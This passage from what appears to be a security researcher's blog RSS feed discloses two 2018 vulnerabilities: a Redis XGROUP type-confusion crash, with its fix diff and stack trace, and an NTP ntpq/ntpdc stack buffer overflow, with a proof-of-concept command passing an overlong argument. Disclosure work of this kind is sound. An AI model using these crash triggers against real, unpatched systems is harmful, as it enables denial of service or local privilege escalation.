Type confusion in the xgroupCommand function in t_stream.c in redis-server in Redis before 5.0 allows remote attackers to cause denial-of-service via an XGROUP command in which the key is not a stream.&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
@@ -1576,7 +1576,7 @@ NULL&lt;br /&gt;
    	/* Lookup the key now, this is common for all the subcommands but HELP. */&lt;br /&gt;
    	if (c-&amp;gt;argc &amp;gt;= 4) {&lt;br /&gt;
		robj *o = lookupKeyWriteOrReply(c,c-&amp;gt;argv[2],shared.nokeyerr);&lt;br /&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;if (o == NULL) return;&lt;br /&gt;&lt;/li&gt;
  &lt;li&gt;if (o == NULL || checkType(c,o,OBJ_STREAM)) return;&lt;br /&gt;
        	s = o-&amp;gt;ptr;&lt;br /&gt;
        	grpname = c-&amp;gt;argv[3]-&amp;gt;ptr;&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
#0 0x6d0706 in logStackContent /home/user/redis/src/debug.c:732:45&lt;br /&gt;
#1 0x6d3917 in sigsegvHandler /home/user/redis/src/debug.c:1089:5&lt;br /&gt;
#2 0x7f65d736e38f  (/lib/x86_64-linux-gnu/libpthread.so.0+0x1138f)&lt;br /&gt;
#3 0x804afc in streamLookupCG /home/user/redis/src/t_stream.c:1502:12&lt;br /&gt;
#4 0x805b36 in xgroupCommand /home/user/redis/src/t_stream.c:1584:19&lt;br /&gt;
#5 0x58ded7 in call /home/user/redis/src/server.c:2298:5&lt;br /&gt;
#6 0x591c70 in processCommand /home/user/redis/src/server.c:2580:9&lt;br /&gt;
#7 0x5e2d98 in processInputBuffer /home/user/redis/src/networking.c:1325:17&lt;br /&gt;
#8 0x565612 in aeProcessEvents /home/user/redis/src/ae.c:443:17&lt;br /&gt;
#9 0x56614c in aeMain /home/user/redis/src/ae.c:501:9&lt;br /&gt;
#10 0x59da71 in main /home/user/redis/src/server.c:3992:5&lt;br /&gt;
#11 0x7f65d6d9d82f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#12 0x43da38 in _start (/home/user/redis/src/redis-server+0x43da38)&lt;br /&gt;
&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12453/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12453/</guid>
        
        
      </item>
    
      <item>
        <title>Cve 2018 12327</title>
        <description>&lt;p&gt;Exploit Title: ntpq and ntpdc 4.2.8p11 Local Buffer Overflow&lt;br /&gt;
Date: 2018-06-06&lt;br /&gt;
Exploit Author: Fakhri Zulkifli (@d0lph1n98)&lt;br /&gt;
Vendor Homepage: http://www.ntp.org/&lt;br /&gt;
Software Link: http://www.ntp.org/downloads.html&lt;br /&gt;
Version: 4.2.8p11 and earlier&lt;br /&gt;
Tested on: 4.2.8p11&lt;br /&gt;
CVE : CVE-2018-12327&lt;br /&gt;
&lt;br /&gt;
Stack-based buffer overflow in ntpq and ntpdc of NTP version 4.2.8p11 allows a local attacker to achieve code execution or escalate to higher privileges via a long string as the argument for an IPv4 or IPv6 command-line parameter.&lt;br /&gt;
&lt;br /&gt;
$ ./ntpq -4 [&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print &quot;A&quot; * 300’&lt;/code&gt;]&lt;br /&gt;
&lt;br /&gt;
#0 0x562fcada86ce in openhost /home/user/ntp-4.2.8p11/ntpq/ntpq.c:655:12&lt;br /&gt;
#1 0x562fcada5f2a in ntpqmain /home/user/ntp-4.2.8p11/ntpq/ntpq.c:606:10&lt;br /&gt;
#2 0x562fcada4729 in main /home/user/ntp-4.2.8p11/ntpq/ntpq.c:469:9&lt;br /&gt;
#3 0x7f79b684982f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#4 0x562fcac96d88 in _start (/home/user/ntp-4.2.8p11/ntpq/ntpq+0xacd88)&lt;br /&gt;
&lt;br /&gt;
$ ./ntpdc -4 [&lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'print &quot;A&quot; * 300'&lt;/code&gt;]&lt;br /&gt;
&lt;br /&gt;
#0 0x55f726641efe in openhost /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:413:12&lt;br /&gt;
#1 0x55f7266400d4 in ntpdcmain /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:365:10&lt;br /&gt;
#2 0x55f72663f269 in main /home/user/ntp-4.2.8p11/ntpdc/ntpdc.c:255:9&lt;br /&gt;
#3 0x7f0fc632382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291&lt;br /&gt;
#4 0x55f7265362d8 in _start (/home/user/ntp-4.2.8p11/ntpdc/ntpdc+0x9d2d8)&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 02 Dec 2018 00:00:00 +0800</pubDate>
        <link>https://fakhrizulkifli.github.io/2018/CVE-2018-12327/</link>
        <guid isPermaLink="true">https://fakhrizulkifli.github.io/2018/CVE-2018-12327/</guid>
        
        
      </item>
    
  </channel>
</rss>
